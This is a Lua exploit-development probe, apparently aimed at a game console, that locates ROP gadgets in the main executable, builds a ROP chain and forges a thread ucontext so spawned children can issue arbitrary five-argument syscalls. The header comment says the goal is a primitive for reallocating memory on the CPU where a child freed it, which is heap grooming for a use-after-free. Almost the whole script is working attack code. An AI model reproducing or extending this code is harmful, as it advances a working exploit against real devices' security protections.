-- CRASH_CLASS: HIGH
-- PROBE 792b: can a thr_create child issue a 5-argument syscall?
--
-- Context: 727a/791c children set RAX (syscall number), RDI, RSI and RDX from
-- the ucontext and issue reads and 662 deletes. A create (669) needs five
-- arguments: flags, descriptor, count, mode, out pointer. The ucontext GP
-- slots beyond RDX are untested, so this probe tries RCX at +0x060 and R8 at
-- +0x068 (mcontext is believed to start at ctx+0x40, which makes RDI=+0x048,
-- RSI=+0x050, RDX=+0x058, RCX=+0x060, R8=+0x068, R9=+0x070, RAX=+0x078).
--
-- If the create runs, the out page holds a non-zero id and the parent can poll
-- it. That gives every child the full six-register syscall surface, and with
-- it allocations on the CPU where a child freed.

print("=== PROBE 792b: child create via ucontext RCX/R8 ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and jmp_g) then print("[0] gadgets missing") return end
print(string.format("[0] eboot=%X", ebase))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end
local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RCX=0x060, R8=0x068, RAX=0x078}

local function run_child(regs)
    local block = mmap(page*2)
    local chain = block + page*2 - 0x100
    local p = chain
    wq(p, uint64(pop_rax)); wq(p+8, uint64(431))
    wq(p+16, uint64(fn));   wq(p+24, uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(chain))
    for k,v in pairs(regs) do wq(ctx+k, uint64(v)) end
    local tb = memory.alloc(8); wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok, rv, tb
end

local data = mmap(page)
wd(data+0x20, 0x2A)

-- [A] control: the child issues the create itself
local out = mmap(page)
local okA, rvA, tbA = run_child({[Ctx.RDI]=1, [Ctx.RSI]=data, [Ctx.RDX]=1,
                                 [Ctx.RCX]=1, [Ctx.R8]=out, [Ctx.RAX]=669})
print(string.format("[A] spawn ok=%s rv=%s tid=%X", tostring(okA), tostring(to_num(rvA)), rd(tbA) or 0))
local idA = rd(out) or 0
print(string.format("[A] child create id=%08X", idA))
if idA ~= 0 then
    local qp, st = mmap(page), mmap(page)
    local okp, rvp = pcall(function() return mk(664)(uint64(out), uint64(1), uint64(qp)) end)
    local okd, rvd = pcall(function() return mk(662)(uint64(out), uint64(1), uint64(st)) end)
    print(string.format("[A] poll=%s/%s state=%08X delete=%s/%08X",
        tostring(okp), tostring(to_num(rvp)), rd(qp) or 0, tostring(okd), rd(st) or 0))
end

-- [B] the same child issues a read on a socketpair, to confirm the other
--     registers of the same context are not disturbed by RCX/R8
local fds = memory.alloc(8)
wd(fds, 0xFFFFFFFF); wd(fds+4, 0xFFFFFFFF)
local okS, rvS = pcall(function() return mk(135)(uint64(1), uint64(1), uint64(0), uint64(fds)) end)
print(string.format("[B] socketpair=%s rv=%s", tostring(okS), tostring(to_num(rvS))))
print("=== PROBE 792b DONE ===")
